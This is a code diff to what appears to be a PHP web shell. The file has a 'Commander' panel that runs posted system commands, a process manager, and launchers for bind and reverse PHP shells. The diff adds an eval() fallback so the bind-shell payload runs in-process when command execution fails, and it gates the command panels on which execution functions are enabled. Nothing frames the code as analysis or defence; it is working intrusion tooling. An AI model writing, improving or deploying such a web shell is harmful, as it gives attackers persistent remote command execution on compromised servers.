@@ -1642,6 +1642,10 @@ function evalRel($command)
 			echo $stdout;
 		}
 	}
+	else
+	{
+		return False;
+	}
 }
 
 
@@ -2394,13 +2398,14 @@ else
 		}
 	}
 }
-?>
 
 
-<br><h3><A NAME='Commander' href="#Commander">Commander</A></h3>
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
+{
+echo "
+<br><h3><A NAME='Commander' href=\"#Commander\">Commander</A></h3>
+<form action='#Commander' method='POST'>";
 
-<form action='#Commander' method='POST'>
-<?php
 if(isset($_POST["system"])) $_SESSION["command_function"] = "system";
 if(isset($_POST["shell_exec"])) $_SESSION["command_function"] = "shell_exec";
 if(isset($_POST["exec"])) $_SESSION["command_function"] = "exec";
@@ -2606,6 +2611,7 @@ else
 			}		
 		}
 	}
+}
 }
 ?>
 
@@ -2847,11 +2853,11 @@ if(isset($_POST["run"]))
 	}		
 }
 
-?>
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
+{
+echo "
+<br><br><h3><A NAME='Process Manager' href=\"#Process Manager\">Process Manager</A></h3>";
 
-<br><br><h3><A NAME='Process Manager' href="#Process Manager">Process Manager</A></h3>
-
-<?php
 if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
 {
 	if(isset($_GET["kill"]))
@@ -3159,6 +3165,10 @@ else
 	}
 	echo "</table>";
 }
+}
+?>
+
+<?php
 
 if(isset($_GET["shell"]) && ($_GET["shell"] == "bps"))
 {
@@ -3197,12 +3207,22 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "bps"))
 	if ($nohup == True)
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
-		evalRel($command);
+		if(evalRel($command)==False)
+		{
+			$phpbindshell = str_replace("<?php", "", $phpbindshell);
+			$phpbindshell = str_replace("?>", "", $phpbindshell);
+			eval($phpbindshell);
+		}
 	}
 	else
 	{
 		$command = "php '$filename' 2>&1";
-		evalRel($command);
+		if(evalRel($command) == False)
+		{
+			$phpbindshell = str_replace("<?php", "", $phpbindshell);
+			$phpbindshell = str_replace("?>", "", $phpbindshell);
+			eval($phpbindshell);
+		}
 		unlink($filename);
 	}
 }
@@ -3245,12 +3265,22 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "rps"))
 	if ($nohup == True)
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
-		evalRel($command);
+		if(evalRel($command)==False)
+		{
+			$phpbindshell = str_replace("<?php", "", $phpbindshell);
+			$phpbindshell = str_replace("?>", "", $phpbindshell);
+			eval($phpbindshell);
+		}
 	}
 	else
 	{
 		$command = "php '$filename' 2>&1";
-		evalRel($command);
+		if(evalRel($command)==False)
+		{
+			$phpbindshell = str_replace("<?php", "", $phpbindshell);
+			$phpbindshell = str_replace("?>", "", $phpbindshell);
+			eval($phpbindshell);
+		}
 		unlink($filename);
 	}
 }
@@ -3291,12 +3321,22 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "bmps"))
 	if ($nohup == True)
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
-		evalRel($command);
+		if(evalRel($command)==False)
+		{
+			$phpbindshell = str_replace("<?php", "", $phpbindshell);
+			$phpbindshell = str_replace("?>", "", $phpbindshell);
+			eval($phpbindshell);
+		}
 	}
 	else
 	{
 		$command = "php '$filename' 2>&1";
-		evalRel($command);
+		if(evalRel($command)==False)
+		{
+			$phpbindshell = str_replace("<?php", "", $phpbindshell);
+			$phpbindshell = str_replace("?>", "", $phpbindshell);
+			eval($phpbindshell);
+		}
 		unlink($filename);
 	}
 }
@@ -3338,12 +3378,22 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "rmps"))
 	if ($nohup == True)
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
-		evalRel($command);
+		if(evalRel($command)==False)
+		{
+			$phpbindshell = str_replace("<?php", "", $phpbindshell);
+			$phpbindshell = str_replace("?>", "", $phpbindshell);
+			eval($phpbindshell);
+		}
 	}
 	else
 	{
 		$command = "php '$filename' 2>&1";
-		evalRel($command);
+		if(evalRel($command)==False)
+		{
+			$phpbindshell = str_replace("<?php", "", $phpbindshell);
+			$phpbindshell = str_replace("?>", "", $phpbindshell);
+			eval($phpbindshell);
+		}
 		unlink($filename);
 	}
 }
@@ -3530,7 +3580,7 @@ else
 
 <?php
 
-if ($eval == True)
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($eval == True))
 {
 echo "
 <table class='flat-table flat-table-3'>
@@ -3570,12 +3620,7 @@ echo "
 			</tr>
 		</form>
 </table>
-";
-}
 
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
-{
-echo "
 <table class='flat-table flat-table-3'>
 		<form action='?shell=bps#Shells' method='post' >
 			<tr>
